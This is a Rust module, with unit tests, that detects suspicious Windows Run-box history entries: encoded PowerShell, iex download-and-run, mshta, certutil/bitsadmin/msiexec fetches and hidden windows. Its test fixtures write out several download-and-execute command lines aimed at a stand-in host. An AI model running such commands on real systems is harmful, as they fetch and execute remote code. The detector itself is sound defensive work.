//! Sorts Run box history entries into fixed categories. The entry text never leaves this file.
use super::{Reading, RunHistory};

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(super) enum Trick {
    EncodedCommand,
    WebScript,
    Mshta,
    DownloadTool,
    HiddenWindow,
}

fn words(entry: &str) -> Vec<String> {
    let entry = entry.strip_suffix("\\1").unwrap_or(entry).to_lowercase();
    entry
        .replace(['^', '`'], "")
        .split(|c: char| c.is_whitespace() || "\"'(),;|&".contains(c))
        .filter(|w| !w.is_empty())
        .map(str::to_owned)
        .collect()
}

fn is_program(word: &str, name: &str) -> bool {
    let file = word.rsplit(['\\', '/']).next().unwrap_or(word);
    file == name || file.strip_suffix(".exe") == Some(name)
}

fn option_of(word: &str) -> Option<&str> {
    word.strip_prefix(['-', '/'])
        .filter(|rest| !rest.is_empty())
}

fn shortens(option: &str, full: &str) -> bool {
    full.starts_with(option)
}

fn is_url(word: &str) -> bool {
    word.starts_with("http://") || word.starts_with("https://")
}

pub(super) fn classify(entry: &str) -> Option<Trick> {
    let words = words(entry);
    let uses = |names: &[&str]| {
        words
            .iter()
            .any(|w| names.iter().any(|name| is_program(w, name)))
    };
    let shell = uses(&["powershell", "pwsh", "powershell_ise"]);
    if shell
        && words.iter().any(|w| {
            option_of(w)
                .is_some_and(|o| o == "ec" || (o.starts_with('e') && shortens(o, "encodedcommand")))
        })
    {
        return Some(Trick::EncodedCommand);
    }
    if words.iter().any(|w| w == "iex" || w == "invoke-expression") {
        return Some(Trick::WebScript);
    }
    if uses(&["mshta"]) {
        return Some(Trick::Mshta);
    }
    let with = |option: &str| {
        words
            .iter()
            .any(|w| option_of(w).is_some_and(|o| o == option))
    };
    if (uses(&["certutil"]) && with("urlcache"))
        || (uses(&["bitsadmin"]) && with("transfer"))
        || (uses(&["rundll32", "msiexec"]) && words.iter().any(|w| is_url(w)))
    {
        return Some(Trick::DownloadTool);
    }
    if shell {
        let hidden = words.windows(2).any(|pair| {
            option_of(&pair[0]).is_some_and(|o| o.starts_with('w') && shortens(o, "windowstyle"))
                && (pair[1] == "1" || shortens(&pair[1], "hidden"))
        });
        if hidden {
            return Some(Trick::HiddenWindow);
        }
    }
    None
}

pub(super) fn summarize<'a>(entries: impl IntoIterator<Item = &'a str>) -> RunHistory {
    let tricks: Vec<Option<Trick>> = entries.into_iter().map(classify).collect();
    let known = |count: usize| Reading::Known(count as u32);
    let of = |trick: Trick| known(tricks.iter().filter(|t| **t == Some(trick)).count());
    RunHistory {
        entries_checked: known(tricks.len()),
        suspicious_entries: known(tricks.iter().flatten().count()),
        encoded_command: of(Trick::EncodedCommand),
        web_script: of(Trick::WebScript),
        mshta: of(Trick::Mshta),
        download_tool: of(Trick::DownloadTool),
        hidden_window: of(Trick::HiddenWindow),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn everyday_entries_never_flag() {
        for entry in [
            "cmd\\1",
            "notepad\\1",
            "control\\1",
            "\\\\server\\share\\1",
            "\\\\192.168.1.5\\scans\\1",
            "regedit\\1",
            "ms-settings:\\1",
            "ms-settings:windowsupdate\\1",
            "calc\\1",
            "services.msc\\1",
            "appwiz.cpl\\1",
            "taskmgr\\1",
            "shell:startup\\1",
            "https://example.com\\1",
            "C:\\Users\\sam\\Documents\\index.html\\1",
            "iexplore\\1",
            "powershell\\1",
            "powershell -NoExit\\1",
            "powershell -ExecutionPolicy Bypass -File C:\\tools\\backup.ps1\\1",
            "cmd /c echo -e hello\\1",
            "cmd /k ping -n 4 example.com\\1",
            "curl --version\\1",
            "wget\\1",
            "certutil -hashfile C:\\file.iso sha256\\1",
            "msiexec /i C:\\setup\\app.msi\\1",
            "rundll32 shell32.dll,Control_RunDLL\\1",
            "bitsadmin /list\\1",
            "",
        ] {
            assert_eq!(classify(entry), None, "{entry}");
        }
    }

    #[test]
    fn encoded_commands_are_found_however_the_option_is_spelled() {
        for entry in [
            "powershell -enc SQBFAFgAIAAoAEkAcgBt\\1",
            "powershell -e SQBFAFgA\\1",
            "powershell.exe -EncodedCommand SQBFAFgA\\1",
            "pwsh -ec SQBFAFgA\\1",
            "POWERSHELL -EnCoDeD SQBFAFgA\\1",
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -enc AAAA\\1",
            "p^owershell -e AAAA\\1",
            "cmd /c \"powershell -nop -enc AAAA\"\\1",
            "powershell /e AAAA\\1",
        ] {
            assert_eq!(classify(entry), Some(Trick::EncodedCommand), "{entry}");
        }
        assert_eq!(
            classify("powershell -ExecutionPolicy Bypass -c dir\\1"),
            None
        );
    }

    #[test]
    fn text_run_as_code_is_found_with_or_without_a_download() {
        for entry in [
            "powershell -w hidden -c \"iex (irm https://a.example/x)\"\\1",
            "powershell -c \"irm https://a.example/x | iex\"\\1",
            "powershell iex(iwr https://a.example/x)\\1",
            "powershell -c Invoke-Expression $x\\1",
            "cmd /c curl -s https://a.example/x | powershell iex\\1",
            "IEX\\1",
        ] {
            assert_eq!(classify(entry), Some(Trick::WebScript), "{entry}");
        }
    }

    #[test]
    fn mshta_is_found_by_its_name_or_its_full_path() {
        for entry in [
            "mshta https://a.example/v.hta\\1",
            "mshta.exe vbscript:Execute(\"x\")\\1",
            "C:\\Windows\\System32\\mshta.exe https://a.example\\1",
            "cmd /c ms^hta https://a.example\\1",
        ] {
            assert_eq!(classify(entry), Some(Trick::Mshta), "{entry}");
        }
    }

    #[test]
    fn download_tools_are_found_only_when_they_fetch_something() {
        for entry in [
            "cmd /c certutil -urlcache -split -f https://a.example/b.exe %temp%\\b.exe\\1",
            "certutil /urlcache -f http://a.example/b.exe b.exe\\1",
            "bitsadmin /transfer job https://a.example/b.exe C:\\b.exe\\1",
            "rundll32 https://a.example/x.dll,Entry\\1",
            "msiexec /i https://a.example/x.msi /qn\\1",
            "msiexec.exe /i \"http://a.example/x.msi\"\\1",
        ] {
            assert_eq!(classify(entry), Some(Trick::DownloadTool), "{entry}");
        }
    }

    #[test]
    fn a_hidden_window_is_found_for_powershell_only() {
        for entry in [
            "powershell -w hidden -c dir\\1",
            "powershell -WindowStyle Hidden -File x.ps1\\1",
            "powershell -win h -c dir\\1",
            "pwsh -w 1 -c dir\\1",
        ] {
            assert_eq!(classify(entry), Some(Trick::HiddenWindow), "{entry}");
        }
        assert_eq!(classify("notepad -w hidden\\1"), None);
        assert_eq!(classify("powershell -WindowStyle Normal\\1"), None);
    }

    #[test]
    fn a_history_is_reduced_to_counts_of_each_kind() {
        let facts = summarize([
            "cmd\\1",
            "powershell -enc AAAA\\1",
            "powershell -w hidden -c dir\\1",
            "mshta https://a.example\\1",
            "iex $x\\1",
            "notepad\\1",
        ]);
        let n = |reading: Reading<u32>| reading.known().copied();
        assert_eq!(n(facts.entries_checked), Some(6));
        assert_eq!(n(facts.suspicious_entries), Some(4));
        assert_eq!(n(facts.encoded_command), Some(1));
        assert_eq!(n(facts.hidden_window), Some(1));
        assert_eq!(n(facts.mshta), Some(1));
        assert_eq!(n(facts.web_script), Some(1));
        assert_eq!(n(facts.download_tool), Some(0));
        let none = summarize([]);
        assert_eq!(n(none.entries_checked), Some(0));
        assert_eq!(n(none.suspicious_entries), Some(0));
    }

    #[test]
    fn the_first_matching_category_wins() {
        assert_eq!(
            classify("powershell -w hidden -enc AAAA\\1"),
            Some(Trick::EncodedCommand)
        );
        assert_eq!(
            classify("powershell -w hidden -c iex $x\\1"),
            Some(Trick::WebScript)
        );
    }
}
